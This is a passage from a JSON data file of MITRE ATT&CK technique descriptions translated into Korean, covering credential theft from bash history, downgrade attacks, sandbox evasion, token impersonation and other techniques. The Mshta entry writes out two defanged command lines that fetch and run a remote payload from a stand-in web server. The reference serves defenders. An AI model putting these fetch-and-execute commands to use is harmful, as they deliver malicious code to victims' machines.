    "description": "적대자는 네트워크 장치에서 스크립팅이나 내장 명령줄 인터프리터(CLI)를 악용하여 악의적인 명령과 페이로드를 실행할 수 있습니다. CLI는 사용자와 관리자가 장치와 상호작용하여 시스템 정보를 조회하거나, 장치 운영을 수정하거나, 진단 및 관리 기능을 수행하는 주요 수단입니다. CLI는 일반적으로 다양한 명령에 필요한 여러 권한 수준을 포함합니다.\n\n스크립팅 인터프리터는 작업을 자동화하고 네트워크 운영 체제에 포함된 명령 세트를 넘어 기능을 확장합니다. CLI와 스크립팅 인터프리터는 직접 콘솔 연결이나 텔넷, 원격 방법을 통해 접근할 수 있습니다.\n\n적대자는 네트워크 CLI를 사용하여 네트워크 장치의 동작과 운영 방식을 변경할 수 있습니다. CLI는 트래픽 흐름을 조작하여 데이터를 가로채거나 수정하고, 악의적인 시스템 소프트웨어를 로드하기 위해 시작 구성 매개변수를 수정하거나, 탐지를 피하기 위해 보안 기능이나 로그 기록을 비활성화하는 데 사용될 수 있습니다.",
    "external_id": "T1059.008",
    "modified": "2022-04-19T20:28:09.848Z",
    "translated": true
  },
  {
    "title": "Bash History",
    "description": "적대자는 손상된 시스템에서 안전하지 않게 저장된 자격 증명을 찾기 위해 bash 명령 기록을 검색할 수 있습니다. Bash는 사용자가 명령줄에 입력한 명령을 \"history\" 유틸리티를 통해 기록합니다. 사용자가 로그아웃하면 이 기록은 사용자의 <code>.bash_history</code> 파일로 플러시됩니다. 각 사용자의 경우 이 파일은 동일한 위치에 저장됩니다: <code>~/.bash_history</code>. 일반적으로 이 파일은 사용자의 마지막 500개 명령을 기록합니다. 사용자는 종종 프로그램의 매개변수로 사용자 이름과 비밀번호를 명령줄에 입력하며, 이는 로그아웃할 때 이 파일에 저장됩니다. 적대자는 이 파일을 살펴보아 잠재적인 자격 증명을 악용할 수 있습니다.",
    "external_id": "T1552.003",
    "modified": "2024-09-12T15:24:04.912Z",
    "translated": true
  },
  {
    "title": "Downgrade Attack",
    "description": "적대자는 시스템 기능의 구버전이나 취약한 버전을 사용하거나 다운그레이드할 수 있으며, 이로 인해 업데이트된 보안 제어를 지원하지 않을 수 있습니다. 다운그레이드 공격은 일반적으로 시스템의 하위 호환성을 이용하여 덜 안전한 운영 모드로 강제 전환합니다.\n\n적대자는 시스템 기능의 다양한 덜 안전한 버전을 다운그레이드하여 사용할 수 있으며, 이를 통해 중간자 공격이나 네트워크 스니핑을 가능하게 하는 네트워크 프로토콜을 악용할 수 있습니다. 예를 들어, PowerShell 5 이상 버전은 실행된 스크립트 내용을 기록할 수 있는 스크립트 블록 로깅(SBL)을 포함하고 있습니다. 그러나 적대자는 SBL을 지원하지 않는 이전 버전의 PowerShell을 실행하려고 시도할 수 있으며, 이는 악성 스크립트를 실행할 때 방어를 저하시킬 의도를 가지고 있습니다.\n\n적대자는 네트워크 트래픽을 타겟으로 하여 암호화된 HTTPS 연결에서 보안이 비어 있는 HTTP 연결로 다운그레이드하여 네트워크 데이터를 평문으로 노출할 수 있습니다.",
    "external_id": "T1562.010",
    "modified": "2023-10-03T16:40:15.445Z",
    "translated": true
  },
  {
    "title": "XPC Services",
    "description": "적대자는 로컬 코드 실행을 위해 XPC 서비스 데몬에 악의적인 콘텐츠를 제공할 수 있습니다. macOS는 XPC 서비스를 사용하여 XPC 서비스 데몬과 제3자 애플리케이션의 특권 헬퍼 도구 간과 같은 다양한 프로세스 간의 기본적인 프로세스 간 통신을 수행합니다. 애플리케이션은 고급 권한이 필요한 작업(예: 네트워크 연결 등)을 처리하기 위해 루트로 실행되는 XPC 서비스 데몬에 메시지를 보낼 수 있으며, 이를 위해 저수준 XPC 서비스 C API 또는 고수준 NSXPCConnection API를 사용할 수 있습니다. 애플리케이션은 XPC 서비스의 청사진 역할을 하는 프로토콜 정의를 제공할 책임이 있습니다. 개발자는 일반적으로 XPC 서비스를 사용하여 애플리케이션의 안정성을 제공하고 애플리케이션 클라이언트와 데몬 간의 권한 분리를 유지합니다.\n\n적대자는 XPC 서비스를 악용하여 악의적인 콘텐츠를 실행할 수 있습니다. 악의적인 실행 요청은 애플리케이션의 XPC 서비스 처리기를 통해 전달될 수 있습니다. 이에는 부적절한 XPC 클라이언트 검증과/또는 입력 매개변수의 불완전한 청소를 식별하고 악용하여 권한 상승을 위한 악용을 수행하는 것도 포함될 수 있습니다.",
    "external_id": "T1559.003",
    "modified": "2024-10-16T16:14:12.793Z",
    "translated": true
  },
  {
    "title": "Virtualization/Sandbox Evasion",
    "description": "적대자는 가상화 및 분석 환경을 탐지하고 회피하기 위해 다양한 수단을 사용할 수 있습니다. 이는 가상 머신 환경(VME)이나 샌드박스를 나타내는 아티팩트의 존재 여부에 대한 검사 결과에 따라 행동을 변경하는 것을 포함할 수 있습니다. 적대자가 VME를 탐지하면, 피해자로부터 분리하기 위해 악성코드를 변경하거나 임플란트의 핵심 기능을 숨길 수 있습니다. 또한 추가 페이로드를 배포하기 전에 VME 아티팩트를 검색할 수도 있습니다. 적대자는 자동 검색 중에 배운 정보를 사용하여 후속 행동을 형성할 수 있습니다.\n\n적대자는 보안 모니터링 도구(예: Sysinternals, Wireshark 등)나 분석 또는 가상화와 관련된 기타 시스템 아티팩트를 확인하는 등의 여러 방법으로 가상화/샌드박스 회피를 달성할 수 있습니다. 또한 적대자는 분석 환경에 있는지 확인하기 위해 합법적인 사용자 활동을 검사할 수 있습니다. 추가 방법으로는 악성코드 내에서 수면 타이머나 루프를 사용하여 임시 샌드박스 내에서 작동하지 않도록 하는 방법 등이 있습니다.",
    "external_id": "T1497",
    "modified": "2024-09-12T15:50:18.049Z",
    "translated": true
  },
  {
    "title": "Web Service",
    "description": "적대자는 기존의 합법적인 외부 웹 서비스를 이용하여 손상된 시스템과의 데이터 전송 수단으로 활용할 수 있습니다. 인기 있는 웹사이트, 클라우드 서비스 및 소셜 미디어가 C2의 메커니즘으로 작용하면 손상 이전에 네트워크 내 호스트가 이미 이들과 소통하고 있을 가능성 덕분에 상당한 위장을 제공할 수 있습니다. Google, Microsoft 또는 Twitter와 같은 일반적인 서비스를 사용하면 적대자가 예상되는 잡음 속에 숨기가 더 쉬워집니다. 웹 서비스 제공업체는 일반적으로 SSL/TLS 암호화를 사용하므로 적대자에게 추가적인 보호 레벨을 제공합니다.\n\n웹 서비스의 사용은 또한 맬웨어 바이너리 분석을 통한 백엔드 C2 인프라의 발견을 보호하고, 운영의 안정성을 유지할 수 있게 해줍니다(이 인프라는 동적으로 변경될 수 있기 때문입니다).",
    "external_id": "T1102",
    "modified": "2024-10-07T17:53:54.380Z",
    "translated": true
  },
  {
    "title": "Credentials In Files",
    "description": "적대자는 안전하지 않게 저장된 자격 증명이 포함된 파일을 찾기 위해 로컬 파일 시스템 및 원격 파일 공유를 검색할 수 있습니다. 이러한 파일은 사용자가 자신의 자격 증명을 저장하기 위해 만든 파일, 개인 그룹을 위한 공유 자격 증명 저장소, 시스템 또는 서비스의 비밀번호가 포함된 구성 파일, 또는 임베디드 비밀번호가 포함된 소스 코드/바이너리 파일일 수 있습니다.\n\n백업 또는 저장된 가상 머신에서 비밀번호를 추출하는 것이 가능합니다. 비밀번호는 또한 Windows 도메인 컨트롤러에 저장된 그룹 정책 기본 설정에서 얻을 수 있습니다.\n\n클라우드 및/또는 컨테이너화된 환경에서는 인증된 사용자 및 서비스 계정 자격 증명이 종종 로컬 구성 및 자격 증명 파일에 저장됩니다. 이러한 정보는 컨테이너 로그의 배포 명령 매개변수로도 발견될 수 있습니다. 어떤 경우에는 이러한 파일을 복사하여 다른 머신에서 재사용하거나, 내용물을 읽고 파일을 복사할 필요 없이 인증하는 데 사용할 수 있습니다.",
    "external_id": "T1552.001",
    "modified": "2024-10-15T14:28:43.639Z",
    "translated": true
  },
  {
    "title": "DNS Calculation",
    "description": "적대자는 DNS 결과에서 반환된 주소에 대해 계산을 수행하여 명령 및 제어에 사용할 포트와 IP 주소를 결정할 수 있으며, 이는 미리 설정된 포트 번호나 실제 반환된 IP 주소에 의존하지 않습니다. IP 및/또는 포트 번호 계산을 사용하여 C2 채널의 출구 필터링을 우회할 수 있습니다.\n\nDNS 계산의 한 구현은 DNS 응답에서 IP 주소의 처음 세 옥텟을 가져와서 해당 값을 사용해 명령 및 제어 트래픽의 포트를 계산하는 것입니다.",
    "external_id": "T1568.003",
    "modified": "2020-03-27T20:54:28.287Z",
    "translated": true
  },
  {
    "title": "Mshta",
    "description": "공격자는 mshta.exe를 악성 .hta 파일과 JavaScript 또는 VBScript의 실행을 프록시하는 데 악용할 수 있습니다. mshta.exe는 초기 침해 및 코드 실행을 위해 다양한 유형의 위협을 활용하는 여러 사례가 있습니다.\n\nMshta.exe는 Microsoft HTML 애플리케이션(HTA) 파일을 실행하는 유틸리티입니다. HTA는 독립 실행형 애플리케이션으로 인터넷 익스플로러의 기술을 사용하지만 브라우저 외부에서 실행됩니다.\n\n파일은 인라인 스크립트를 통해 mshta.exe에 의해 실행될 수 있습니다: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\n\nURL에서 직접 실행될 수도 있습니다: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe는 그 잠재적 사용을 고려하지 않는 애플리케이션 제어 솔루션을 우회하는 데 사용될 수 있습니다. mshta.exe는 인터넷 익스플로러의 보안 컨텍스트 외부에서 실행되기 때문에 브라우저 보안 설정도 우회합니다.",
    "external_id": "T1218.005",
    "modified": "2022-03-11T20:38:28.802Z",
    "translated": true
  },
  {
    "title": "Login Items",
    "description": "적대적 행위자는 사용자 로그인 시 실행하여 지속성을 유지하거나 권한을 상승시키기 위해 로그인 항목을 추가할 수 있습니다. 로그인 항목은 사용자가 로그인할 때 자동으로 실행되는 응용 프로그램, 문서, 폴더 또는 서버 연결입니다. 로그인 항목은 공유 파일 목록이나 서비스 관리 프레임워크를 통해 추가할 수 있습니다. 공유 파일 목록 로그인 항목은 AppleScript와 같은 스크립팅 언어를 사용하여 설정할 수 있으며, 서비스 관리 프레임워크는 API 호출 SMLoginItemSetEnabled를 사용합니다.\n\n서비스 관리 프레임워크를 통해 설치된 로그인 항목은 launchd를 활용하며 시스템 환경설정에서 보이지 않으며, 생성한 응용 프로그램만이 삭제할 수 있습니다. 공유 파일 목록을 사용하여 생성된 로그인 항목은 시스템 환경설정에서 보이며, 실행 시 응용 프로그램을 숨길 수 있으며, Finder를 사용하지 않고도 LaunchServices를 통해 애플리케이션, 문서 또는 URL을 여는 데 사용됩니다. 사용자와 응용 프로그램은 로그인 항목을 사용하여 자주 사용하는 서비스나 응용 프로그램(예: 이메일, 채팅, 음악 응용 프로그램)을 실행하도록 사용자 환경을 구성합니다.\n\n적대적 행위자는 AppleScript와 기본 API 호출을 사용하여 악성 실행 파일을 생성하는 로그인 항목을 만들 수 있습니다. macOS 10.5 이전 버전에서는 적대적 행위자가 AppleScript를 사용하여 \"System Events\" 프로세스에 Apple 이벤트를 보내 로그인 항목을 추가할 수 있습니다. 적대적 행위자는 \"System Events\" 애플리케이션에 로그인 항목을 추가하기 위한 명령을 사용할 수 있습니다. 이 명령은 악성 실행 파일의 경로를 로그인 항목 파일 목록에 추가합니다. 적대적 행위자는 또한 로그인 항목을 사용하여 피해자의 시스템을 원격으로 제어하거나 사용자 자격 증명을 요청하여 권한 상승을 위한 수단으로 사용할 수 있는 실행 파일을 실행할 수 있습니다.",
    "external_id": "T1547.015",
    "modified": "2021-10-18T16:36:37.042Z",
    "translated": true
  },
  {
    "title": "Stage Capabilities",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 기능을 업로드, 설치 또는 설정할 수 있습니다. 그들의 작전을 지원하기 위해, 적대자는 자신들이 개발했거나 획득한 기능을 그들이 통제하는 인프라에 배치할 필요가 있을 수 있습니다. 이러한 기능은 적대자가 이전에 구매하거나 임대한 인프라에 배치되거나 그들이 침해한 인프라에 배치될 수 있습니다. 기능은 GitHub 또는 Pastebin과 같은 웹 서비스나 사용자가 쉽게 애플리케이션을 프로비저닝할 수 있게 해주는 플랫폼 서비스(PaaS)에도 배치될 수 있습니다.\n\n기능의 배치는 적대자가 여러 초기 접근 및 후속 침해 행동을 수행하는 데 도움을 줄 수 있으며, 여기에는 다음과 같은 것들이 포함됩니다:\n\n* 사용자가 사이트를 탐색할 때 드라이브 바이 컴프라미스를 수행하는 데 필요한 웹 자원 배치.\n* 스피어피싱에 사용될 링크 타겟을 위한 웹 자원 배치.\n* 피해자 네트워크에서 접근 가능한 위치에 악성코드나 도구를 업로드하여 침입 도구 전송을 가능하게 함.\n* 명령 및 제어 트래픽을 암호화하는 데 사용할 SSL/TLS 인증서를 설치함.",
    "external_id": "T1608",
    "modified": "2022-10-19T22:01:05.551Z",
    "translated": true
  },
  {
    "title": "Link Target",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 링크로 참조되는 리소스를 설정할 수 있습니다. 적대자는 사용자가 악성 링크를 클릭하도록 의존하여 정보를 공개하거나 실행을 얻으려고 할 수 있습니다. 링크는 스피어피싱에 사용될 수 있으며, 이는 사회공학적 텍스트가 포함된 이메일을 보내 사용자가 URL을 클릭하거나 복사하여 브라우저에 붙여넣도록 유도하는 것입니다. 정보를 위한 피싱이나 시스템에 대한 초기 접근을 얻기 위한 피싱에 앞서, 적대자는 스피어피싱 링크의 링크 타겟을 위한 리소스를 설정해야 합니다.\n\n일반적으로 링크 타겟의 리소스는 사용자에게 어떤 콘텐츠를 제공할지 결정하는 클라이언트 측 스크립트가 포함될 수 있는 HTML 페이지입니다. 적대자는 합법적인 사이트를 복제하여 링크 타겟으로 사용할 수 있으며, 이는 합법적인 웹 서비스의 로그인 페이지나 조직의 로그인 페이지를 복제하여 스피어피싱 중에 자격 증명을 수집하려는 노력을 포함할 수 있습니다. 적대자는 또한 악성코드를 업로드하고 링크 타겟이 사용자가 다운로드/실행할 악성코드를 가리키도록 할 수 있습니다.\n\n적대자는 인프라를 획득하는 동안 합법적인 도메인과 유사한 도메인(예: 동형문자, 오타사기, 다른 최상위 도메인 등)을 구매하여 악성 링크를 촉진할 수 있습니다.\n\n링크는 적대자가 실제 목적지를 숨기기 위해 작성하여 URL 스키마를 악용하고 피싱의 효과를 높이기 위해 희생자를 속이는 데 사용될 수 있습니다.\n\n적대자는 또한 링크 축소 서비스 및 플랫폼 서비스 제공업체에서 무료 또는 유료 계정을 사용하여 링크 타겟을 호스팅하고, 해당 제공업체의 광범위하게 신뢰받는 도메인을 활용하여 악성 페이지로 리다이렉션 할 때 차단되지 않도록 할 수 있습니다. 또한 적대자는 고유하게 생성된 URI/URL을 통해 다양한 악성 링크를 제공할 수 있습니다(일회성 링크 포함). 마지막으로, 적대자는 인터플라네타리 파일 시스템(IPFS)의 분산 특성을 활용하여 제거하기 어려운 링크 타겟을 호스팅할 수 있습니다.",
    "external_id": "T1608.005",
    "modified": "2024-10-16T20:09:41.391Z",
    "translated": true
  },
  {
    "title": "Multi-Stage Channels",
    "description": "적대자는 서로 다른 조건이나 특정 기능을 위해 여러 단계를 가진 명령 및 제어 체계를 만들 수 있습니다. 여러 단계를 사용하는 것은 감지를 더 어렵게 만들기 위해 명령 및 제어 채널을 흐리게 할 수 있습니다.\n\n원격 액세스 도구는 지침을 위해 첫 번째 단계의 명령 및 제어 서버에 다시 연결할 것입니다. 첫 번째 단계는 기본 호스트 정보를 수집하고 도구를 업데이트하며 추가 파일을 업로드하는 자동화 기능을 가질 수 있습니다. 이 시점에서 두 번째 원격 액세스 도구(RAT)가 업로드되어 호스트를 두 번째 단계의 명령 및 제어 서버로 리디렉션할 수 있습니다. 두 번째 단계는 아마도 더 많은 기능을 갖추고 있어 적대자가 역 셸 및 추가 RAT 기능을 통해 시스템과 상호작용할 수 있도록 허용할 것입니다.\n\n각 단계는 겹치는 인프라 없이 별도로 호스팅될 가능성이 큽니다. 로더는 원래의 첫 번째 단계 통신 경로가 발견되어 차단될 경우를 대비하여 백업 첫 단계 콜백 또는 대체 경로를 가질 수 있습니다.",
    "external_id": "T1104",
    "modified": "2020-07-14T19:43:38.181Z",
    "translated": true
  },
  {
    "title": "Financial Theft",
    "description": "적대자는 강탈, 사회 공학, 기술적 절도 또는 다른 방법을 통해 목표로부터 금전적 자원을 훔칠 수 있으며, 이는 피해자가 이 자원을 이용할 수 있는 가능성을 희생하면서 자신의 재정적 이익을 추구하는 것입니다. 재정적 절도는 랜섬웨어에 의한 강탈, 비즈니스 이메일 사기(BEC) 및 사기, '돼지 도살' , 은행 해킹, 그리고 암호화폐 네트워크 착취와 같은 여러 인기 있는 캠페인 유형의 궁극적인 목표입니다.\n\n적대자는 무단 자금 이동을 수행하기 위해 계정을 침해할 수 있습니다. 비즈니스 이메일 사기 또는 이메일 사기의 경우, 적대자는 신뢰할 수 있는 개체를 가장할 수 있습니다. 사회 공학이 성공적으로 이루어지면, 피해자를 속여 적대자가 제어하는 금융 계좌로 돈을 보내도록 유도할 수 있습니다. 이는 재정적 절도와 관련된 사건에서 여러 피해자(즉, 침해된 계정과 궁극적인 금전적 손실)를 발생시킬 가능성을 만듭니다.\n\n랜섬웨어에 의한 강탈은 예를 들어, 적대자가 데이터 암호화 및 데이터 유출 후 피해자로부터 지불을 요구할 때 발생할 수 있으며, 지불이 이루어지지 않으면 민감한 데이터를 공개하겠다고 위협하는 방식입니다. 적대자는 전용 유출 사이트를 사용해 피해자 데이터를 배포할 수 있습니다.\n\n재정적 절도의 잠재적으로 엄청난 사업적 영향을 고려할 때, 적대자는 재정적 절도의 가능성을 남용하고 금전적 이익을 추구하여 그들의 진정한 목표인 데이터 파괴와 사업 중단으로부터 주의를 분산시킬 수 있습니다.",
    "external_id": "T1657",
    "modified": "2024-10-15T15:58:10.254Z",
    "translated": true
  },
  {
    "title": "Execution Guardrails",
    "description": "적대자는 실행 가드레일을 사용하여 적대자가 제공한 조건과 대상에 존재할 것으로 예상되는 환경 특정 조건을 기반으로 실행이나 행동을 제한할 수 있습니다. 가드레일은 페이로드가 의도된 대상에 대해서만 실행되도록 보장하며, 적대자의 캠페인으로 인한 부수적 피해를 줄입니다. 적대자가 가드레일로 사용할 수 있는 대상 시스템이나 환경에 대한 정보에는 특정 네트워크 공유 이름, 연결된 물리적 장치, 파일, 가입된 Active Directory(AD) 도메인 및 로컬/외부 IP 주소가 포함될 수 있습니다.\n\n가드레일은 의도하지 않은 환경에서 능력이 드러나는 것을 방지하는 데 사용할 수 있습니다. 이러한 가드레일의 사용은 일반적인 가상화/샌드박스 회피와는 구별됩니다. 가상화/샌드박스 회피의 경우 알려진 샌드박스 값을 확인하고 일치하지 않는 경우에만 실행을 계속하는 것과 관련이 있을 수 있지만, 가드레일의 사용은 예상되는 대상 특정 값을 확인하고 그러한 일치가 있을 때만 실행을 계속하는 것과 관련됩니다.\n\n적대자는 특정 사용자 에이전트를 식별하고 차단하여 방어를 회피하고 공격의 범위를 피해자와 가장 효과적인 플랫폼으로 좁힐 수 있습니다. 사용자 에이전트는 사용자의 소프트웨어 애플리케이션, 운영 체제, 공급업체 및 버전과 같은 데이터를 자체 식별합니다. 적대자는 운영 체제를 식별하기 위해 사용자 에이전트를 확인한 다음, 취약한 소프트웨어에 대해서만 악성 코드를 제공하고 다른 모든 운영 체제는 무시할 수 있습니다.",
    "external_id": "T1480",
    "modified": "2024-06-07T14:30:23.491Z",
    "translated": true
  },
  {
    "title": "Cloud Storage Object Discovery",
    "description": "적대자는 클라우드 저장소 인프라에서 객체를 나열할 수 있습니다. 적대자는 자동화된 검색 중에 이 정보를 사용하여 후속 행동을 결정할 수 있으며, 여기에는 클라우드 저장소에서 모든 객체 또는 특정 객체를 요청하는 것이 포함됩니다. 로컬 호스트에서 파일 및 디렉터리 검색과 유사하게, 사용 가능한 저장 서비스(즉, 클라우드 인프라 검색)를 식별한 후 적대자는 클라우드 인프라에 저장된 콘텐츠/객체에 접근할 수 있습니다.\n\n클라우드 서비스 제공업체는 사용자가 클라우드 저장소에 저장된 객체를 나열할 수 있는 API를 제공합니다.",
    "external_id": "T1619",
    "modified": "2022-04-11T22:29:43.677Z",
    "translated": true
  },
  {
    "title": "Web Cookies",
    "description": "적대자가 웹 애플리케이션이나 인터넷 서비스에 접근하기 위해 사용할 수 있는 웹 쿠키를 위조할 수 있습니다. 웹 애플리케이션과 서비스(클라우드 SaaS 환경 또는 온프레미스 서버에서 호스팅됨)는 종종 사용자 접근을 인증하고 권한 부여하기 위해 세션 쿠키를 사용합니다.\n\n적대자는 이러한 쿠키를 생성하여 웹 리소스에 접근할 수 있습니다. 이는 새로운 쿠키가 적대자에 의해 위조되며, 합법적인 사용자로부터 도난당하거나 가로채어진 것이 아니라는 점에서 '웹 세션 쿠키 도난'이나 기타 유사한 행동과 다릅니다. 대부분의 일반적인 웹 애플리케이션에는 제공된 도구나 인터페이스를 사용하여 생성할 수 있는 표준화되고 문서화된 쿠키 값이 있습니다. 웹 쿠키의 생성은 종종 비밀번호, 개인 키 또는 기타 암호학적 시드 값과 같은 비밀 값을 필요로 합니다.\n\n한 번 위조되면, 적대자는 이러한 웹 쿠키를 사용하여 리소스에 접근할 수 있으며, 이는 다단계 인증 및 기타 인증 보호 메커니즘을 우회할 수 있습니다.",
    "external_id": "T1606.001",
    "modified": "2023-09-19T21:25:10.511Z",
    "translated": true
  },
  {
    "title": "Log Enumeration",
    "description": "적대자는 시스템 및 서비스 로그를 열거하여 유용한 데이터를 찾을 수 있습니다. 이러한 로그는 사용자 인증 기록, 보안 또는 취약한 소프트웨어, 또는 침해된 네트워크 내 호스트와 같은 다양한 유형의 가치 있는 통찰력을 강조할 수 있습니다.\n\n호스트 바이너리는 시스템 로그를 수집하는 데 활용될 수 있습니다. 예를 들어, Windows에서 `wevtutil.exe`나 PowerShell을 사용하여 보안 이벤트 정보를 접근하고/또는 내보낼 수 있습니다. 클라우드 환경에서는 적대자가 Azure VM Agent의 `CollectGuestLogs.exe`와 같은 유틸리티를 사용하여 클라우드 호스팅 인프라에서 보안 로그를 수집할 수 있습니다.\n\n적대자는 또한 SIEM과 같은 중앙 집중형 로깅 인프라를 목표로 할 수 있습니다. 로그는 대량으로 내보내져 적대자 통제 하의 인프라로 전송되어 오프라인 분석을 위해 사용될 수 있습니다.\n\n환경에 대한 이해를 높이는 것 외에도, 적대자는 실시간으로 로그를 모니터링하여 사건 대응 절차를 추적할 수 있습니다. 이를 통해 그들은 지속성을 유지하거나 방어를 회피하기 위해 기술을 조정할 수 있습니다.",
    "external_id": "T1654",
    "modified": "2024-10-15T12:24:40.892Z",
    "translated": true
  },
  {
    "title": "Token Impersonation/Theft",
    "description": "적대자는 다른 사용자의 기존 토큰을 복제한 후 이를 가장하여 권한을 상승시키고 접근 제어를 우회할 수 있습니다. 예를 들어, 적대자는 `DuplicateToken` 또는 `DuplicateTokenEx`를 사용하여 기존 토큰을 복제할 수 있습니다. 그런 다음 이 토큰은 `ImpersonateLoggedOnUser`와 함께 사용되어 호출 스레드가 로그인한 사용자의 보안 컨텍스트를 가장하도록 하거나, `SetThreadToken`을 사용하여 가장된 토큰을 스레드에 할당하는 데 사용될 수 있습니다.\n\n적대자는 특정한 기존 프로세스에 복제된 토큰을 할당하고자 할 때 [토큰 가장/도난]을 수행할 수 있습니다. 예를 들어, 이것은 대상 사용자가 시스템에서 비네트워크 로그온 세션을 가지고 있을 때 유용할 수 있습니다.\n\n적대자가 기존 프로세스에 연결하기보다는 복제된 토큰을 사용하여 새로운 프로세스를 생성하려는 경우, 그들은 또한 `CreateProcessWithTokenW` 또는 `CreateProcessAsUserW`를 사용하여 [토큰으로 프로세스 생성]을 수행할 수 있습니다. [토큰 가장/도난]은 또한 새로운 토큰을 생성하는 것이 아니라 기존 토큰을 복제하는 것과 관련이 있기 때문에 [토큰 생성 및 가장]와 구별됩니다.",
    "external_id": "T1134.001",
    "modified": "2024-01-10T17:57:36.177Z",
    "translated": true
  },
  {
    "title": "Exfiltration to Code Repository",
    "description": "적대자는 주요 명령 및 제어 채널을 통해서가 아니라 코드 저장소로 데이터를 유출할 수 있습니다. 코드 저장소는 종종 API를 통해 접근할 수 있으며, 이러한 API에 대한 접근은 대개 HTTPS를 통해 이루어져 적대자에게 추가적인 보호 수준을 제공합니다.\n\n코드 저장소로의 유출은 네트워크 내에서 이미 사용되는 인기 있는 서비스인 경우 적대자에게 상당한 은폐를 제공할 수 있습니다.",
    "external_id": "T1567.001",
    "modified": "2023-09-15T19:08:16.882Z",
    "translated": true
  },
  {
    "title": "Cloud Services",
    "description": "적대자는 취약한 환경 내에서 온프레미스 사용자 신원과 동기화되거나 연합된 유효한 계정을 사용하여 접근 가능한 클라우드 서비스에 로그인할 수 있습니다. 그 후 적대자는 로그인된 사용자로서 관리 작업을 수행하거나 클라우드 호스팅 리소스에 접근할 수 있습니다.\n\n많은 기업은 중앙에서 관리되는 사용자 신원을 클라우드 서비스에 연합하여 사용자가 도메인 자격 증명을 사용하여 클라우드 제어 면에 접근할 수 있도록 허용합니다. 유사하게, 적대자는 웹 콘솔이나 클라우드 명령줄 인터페이스(CLI)를 통해 사용 가능한 클라우드 서비스에 연결할 수 있습니다. 예를 들어 Azure PowerShell의 경우 `<code>Connect-AZAccount</code>`, Microsoft Graph PowerShell의 경우 `<code>Connect-MgGraph</code>`, Google Cloud CLI의 경우 `<code>gcloud auth login</code>`와 같은 명령어를 사용할 수 있습니다.\n\n경우에 따라 적대자는 사용자 이름과 비밀번호 대신 애플리케이션 접근 토큰을 통해 이러한 서비스에 인증할 수 있을지도 모릅니다.",
    "external_id": "T1021.007",
    "modified": "2024-10-15T15:52:47.255Z",
    "translated": true
  },
  {
    "title": "Port Knocking",
    "description": "적대자는 포트 노킹을 사용하여 지속성이나 명령 및 제어에 사용되는 열린 포트를 숨길 수 있다. 포트를 활성화하기 위해 적대자는 미리 정의된 닫힌 포트의 순서에 따라 일련의 연결 시도를 보낸다. 이 순서가 완료된 후, 포트를 여는 것은 종종 호스트 기반 방화벽에 의해 수행되지만, 사용자 정의 소프트웨어로도 구현될 수 있다.\n\n이 기술은 동적으로 수신 대기 포트를 열거나 다른 시스템의 수신 서버에 대한 연결을 시작하는 데 모두 관찰되었다.\n\n통신을 유도하는 신호 패킷의 관찰은 다양한 방법을 통해 수행될 수 있다. 원래 Cd00r에 의해 구현된 한 가지 방법은 libpcap 라이브러리를 사용하여 해당 패킷을 스니핑하는 것이다. 또 다른 방법은 원시 소켓을 활용하여 악성코드가 다른 프로그램에서 이미 사용 중인 포트를 사용할 수 있게 하는 것이다.",
    "external_id": "T1205.001",
    "modified": "2022-03-11T18:31:23.996Z",
    "translated": true
  },
  {
    "title": "LNK Icon Smuggling",
    "description": "적대자는 콘텐츠 필터를 우회하여 악성 페이로드를 다운로드하는 명령을 숨기기 위해 겉보기에는 무해한 Windows 바로 가기 파일(.LNK) 내에 숨길 수 있습니다. Windows 바로 가기 파일은 LNK 파일이 호스트 디렉터리 내에서 표시될 아이콘 파일의 경로를 지정하기 위해 설계된 아이콘 위치 필드(아이콘 환경 데이터 블록이라고도 함)를 포함한 여러 메타데이터 필드를 포함합니다. \n\n적대자는 이 LNK 메타데이터를 악성 페이로드를 다운로드하는 데 악용할 수 있습니다. 예를 들어, 적대자가 LNK 파일을 피싱 페이로드로 사용하여 악성코드를 전달하는 사례가 관찰되었습니다. 호출될 때(LNK 아이콘 위치 필드 내의 외부 URL을 통해 참조된 페이로드가 다운로드될 수 있음) 이러한 파일은 LNK의 대상 경로 필드 내에서 명령 및 스크립팅 인터프리터/시스템 바이너리 프록시 실행 인수에 의해 호출될 수 있습니다. \n\nLNK 아이콘 밀반입은 감염된 호스트에서 LNK를 실행하여 추가적인 악성 페이로드를 다운로드하는 악성 스크립트와 같은 데이터 유출 이후에도 활용될 수 있습니다.",
    "external_id": "T1027.012",
    "modified": "2023-10-17T02:12:05.242Z",
    "translated": true
  },
  {
    "title": "Web Services",
    "description": "적대자들은 목표 설정 중에 사용할 수 있는 웹 서비스에 등록할 수 있습니다. 적대자들이 후속 단계에서 악용할 수 있는 웹 기반 서비스에 등록할 수 있는 다양한 인기 웹사이트가 존재합니다. 일반적인 서비스, 예를 들어 Google이나 Twitter에서 제공하는 서비스는 적대자들이 예상되는 소음 속에 숨는 것을 더욱 쉽게 만들어줍니다. 웹 서비스를 활용함으로써 적대자들은 물리적으로 그들의 운영을 추적하기 어렵게 만들 수 있습니다.",
    "external_id": "T1583.006",
    "modified": "2024-01-16T22:47:59.395Z",
    "translated": true
  },
  {
    "title": "Steal Application Access Token",
    "description": "상대방은 원격 시스템 및 리소스에 접근하기 위해 자격 증명을 획득하는 수단으로 애플리케이션 접근 토큰을 훔칠 수 있습니다.\n\n애플리케이션 접근 토큰은 사용자 또는 서비스의 권한으로 승인된 API 요청을 하는 데 사용되며, 클라우드 및 컨테이너 기반 애플리케이션과 소프트웨어 서비스(SaaS)에서 리소스에 접근하는 방법으로 일반적으로 사용됩니다. 클라우드 및 컨테이너화된 환경에서 계정 API 토큰을 훔친 상대방은 이러한 계정의 권한으로 데이터를 접근하고 작업을 수행할 수 있어 권한 상승 및 환경의 추가 손상을 초래할 수 있습니다.\n\n예를 들어, Kubernetes 환경에서는 컨테이너 내에서 실행되는 프로세스가 서비스 계정 토큰을 사용하여 Kubernetes API 서버와 통신할 수 있습니다. 만약 컨테이너가 손상될 경우, 상대방은 컨테이너의 토큰을 훔쳐 Kubernetes API 명령에 접근할 수 있습니다. 유사하게, 지속 개발/지속 통합(CI/CD) 파이프라인 내의 인스턴스는 종종 테스트 및 배포를 위해 다른 서비스에 인증하는 데 API 토큰을 사용합니다. 이러한 파이프라인이 손상될 경우, 상대방은 이러한 토큰을 훔쳐 그 권한을 이용할 수 있습니다.\n\n토큰 도용은 사회 공학을 통해서도 발생할 